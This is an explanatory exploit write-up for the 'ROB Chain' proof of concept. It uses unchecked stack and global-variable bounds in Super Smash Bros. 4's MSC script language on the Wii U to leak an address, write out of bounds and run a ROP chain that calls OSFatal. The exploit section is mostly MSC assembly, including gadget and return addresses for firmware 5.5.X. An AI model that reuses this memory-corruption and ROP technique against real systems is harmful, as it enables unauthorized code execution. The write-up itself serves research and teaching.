# ROB Chain Proof of Concept Breakdown
*Exploit and article written by jam1garner*

---

### Prerequisites and definitions
*What you should probably wrap your head around before reading*

* Idea of what a stack is in computer science ([Read about it here](https://en.wikipedia.org/wiki/Stack_(abstract_data_type)))
* Integer/Int/uint32 - non decimal number used by a computer (In this case a 32-bit integer, as the Wii U is 32-bit)
* Float - decimal number used by a computer (32-bit)
* Hexadecimal number system, Note: in this article it  ([Read about it here](https://en.wikipedia.org/wiki/Hexadecimal))

### Introduction

ROB Chain is written in MSC assembly. If you haven't heard of it, don't worry because it's the language used solely for the character moveset logic of Super Smash Brothers 4 and even then it (to my knowledge) has (since the release) been deprecated on 3ds. There isn't much that you really need to know about to understand about MSC asm to understand this exploit.

###### Language design

MSC uses a stack to store parameters that the language designers wanted to be possible to use a variable. For example if they didn't do this how could they do this:
`sub 1,3`, this: `sub var1,var3` AND this: `sub 1,var3` without complexifying their language more than needed? Instead you'd do something like this to add an integer and a variable in MSC asm:
```asm
pushInt. 3   # Pushes the integer 3 (duh)
pushVar. 0,1 # Pushes the variable 1 (the second variable) of type 0 (0 = local, 1 = global)
add.         # Pushes 3 + localVar1 onto the stack
```

###### The bug

Here is the memory layout of how the MSC info is stored in memory.

| Type | Data stored |
| ---- | ----------- |
| uint32 | MSC File offset |
| uint32[64] | Global Variables |
| idk | Some other stuff |
| uint32[128] | MSC Stack |
| uint32 | MSC Stack index |
| uint32 | MSC Local Variable index |
| lots of uint32s | Other assorted data |

Through analysis of the Smash binary I identified that the MSC stack does not check if the push or pop will put the MSC stack index out of bounds (less than 0 or greater than 127).

###### The other bug

Also global variable access has no bounds check. ¯\\\_(ツ)\_/¯

## Breakdown of the Exploit



```asm
begin 0,0

#Get to end of stack for overflow
#Get to top of stack
pushShort. 0x1
pushShort. 0x2
pushShort. 0x3
... (etc)
pushShort. 0x7f
pushShort. 0x80
```
I push 128 values onto the stack, which completely fills it, leaving out index pointing *at* the index, meaning our next value pushed onto the stack will overwrite the stack index. The push code essentially goes:

- get index at stackPosition+0x200
- write the value at stackPosition + (index << 2)
   - Note: right shift 2 `foo << 2` is equivelant to `foo * 4`
- add 1 to the index
- store it back at stackPosition+0x200

this means overwriting the value lets us write anywhere, but there is one catch: where we write is always relative to our MSC info structure... which isn't always located in the same place. So how do we get around this? We need to find an address leak, essentially finding an absolute offset that is located at a specific spot relative to our relative read in order to orient ourselves.

```asm
pushShort. 0xAE
```

Why 0xAE? Because 0x2E ints past the stack is always an address that is located at that same address. Why? Who knows. But this allows us to calculate where we are currently.

```asm
setVar globalVar,leakedAddress
```

Here we take that value and place it in the globalVar I named leakedAddress. This is essentially copying it so that we can access once we are back on top of our stack and able to do arithmetic without overwriting potentially important values.

```asm
pop
repeat 0xAC more times
```

These pops do nothing except reduce the index. So it's useful for getting back to the stack without harming it.

```asm
pushVar. globalVar,leakedAddress
pushShort. 0x2B4
subi.
setVar globalVar,mscStackAddress
pushInt. writePosition
pushVar. globalVar,mscStackAddress
subi.
pushShort. 4
divi.
setVar globalVar,calculatedStackPosition
```

This is essentially
```C
mscStackAddress = (leakedAddress - 0x2B4);
calculatedStackPosition = (writePosition - mscStackAddress) / 4;
```
Where writePosition is our hardcoded absolute write address that I define at the beginning of the script. Essentially this will take our leaked address we got earlier and use it to calculate the stack index needed to write there.

Now there is one more thing I do here, and this isn't needed for ROP but it is needed for using this to load a payload (in this case a user-defined string).

```asm
pushShort. 0x1
pushShort. 0x2
... (etc)
pushShort. 0x7f
pushShort. 0x80
```

Let's push 128 more integers onto the stack again for overwriting the stack index again.

```asm
pushInt. -0x8A
setVar globalVar,mscScriptAddress
pushVar. globalVar,mscScriptAddress
```

Here we are jumping to a negative address which puts us right before the global vars, which is (if you look back at my structure layout chart earlier) the address of the script. Then we store that for later, so we can safely use it for arithmetic again.

```asm
pushVar. globalVar,0x0
pushVar. globalVar,0x1
... (etc)
pushVar. globalVar,0x88
pushVar. globalVar,0x89
```

This part is pretty neat because it is using the aforementioned globalVar out of bounds access bug in order to safely make our way back to the stack. Unlike moving down the stack with `pop` we can't move up towards the stack without overwriting something. We can use this to write our way back over our global vars and the data between them and the stack without potentially breaking smoething.

```asm
pushShort. 0x30
#script_1 is the offset of the second "script", which contains our string to print out
pushInt. script_1
addi.
i+= globalVar,mscScriptAddress
#mscScriptAddress = 0x30 + mscFileAddress + relativeAddress of script_1 (the string)
```
Just some math to calculate the absolute offset to the spot in the file where we are storing the string. Not really important how it works besides that.

```asm
#Get back to end of stack for overflow for the millionth time
pushShort. 0x1
pushShort. 0x2
... (etc)
pushShort. 0x7f
pushShort. 0x80
```

Self explanatory.

```asm
#Now we can overwrite the stack position with the one we calculated earlier to jump to the write position
pushVar. globalVar,calculatedStackPosition
```
Overwrite with our previously calculated index. This (in my source) is the next return address on the stack. Now all we have to do is write our ROP chain, end the script and our code executes. Essentially the PoC chain just does:

* Sets the return address to some code that will load an r3 value then return
* Puts the address of our string that we calculated at the position r3 will be loaded from
* Fills a lot of values we don't need
* Makes the next return address be where OSFatal is locted in memory on 5.5.X
* **Note:** r3 is used as the only parameter of OSFatal which is the address of the string to print

```asm
#Write ROP chain
pushInt. 0xC00C650  #Gadget to load the r3 value
pushVar. globalVar,mscScriptAddress #r3 value (will be printed by OSFatal)
pushInt. 0xBEEF0001
pushInt. 0xBEEF0002
pushInt. 0xBEEF0003
pushInt. 0xBEEF0004
pushInt. 0xBEEF0005
pushInt. 0xBEEF0006
pushInt. 0xBEEF0007
pushInt. 0xBEEF0008
pushInt. 0xBEEF0009
pushInt. 0xBEEF000A
pushInt. 0xBEEF000B
pushInt. 0xBEEF000C
pushInt. 0xBEEF000D
pushInt. 0xBEEF000E
pushInt. 0xBEEF000F
pushInt. 0xBEEF0010
pushInt. 0xBEEF0011
pushInt. 0xBEEF0012
pushInt. 0xBEEF0013
pushInt. 0xBEEF0014
pushInt. 0xBEEF0015
pushInt. 0xBEEF0016
pushInt. 0xBEEF0017
pushInt. 0xBEEF0018
pushInt. 0xBEEF0019
pushInt. 0xBEEF001A
pushInt. 0x01031618 #return address (OSFatal)

#Execute ROP chain
exit
```

## Why not use this to load homebrew?

Sadly... code execution doesn't necessarily make homebrew loading easy. In one way or another we need JIT (only browser has JIT) or write access to code sections in order to do that in a way that doesn't require exploiting kernel or IOSU through ROP. So instead of making this secondary exploit load homebrew I decided to focus my effort on exploiting the browser after completing this PoC.

Questions? Comments? Concerns? Contact me on twitter @jam1garner, Discord @jam1garner#7693, or probably anything else as jam1garner. If you appreciate my work let me know (hopefully through twitter) as I love to hear that people like things I made.
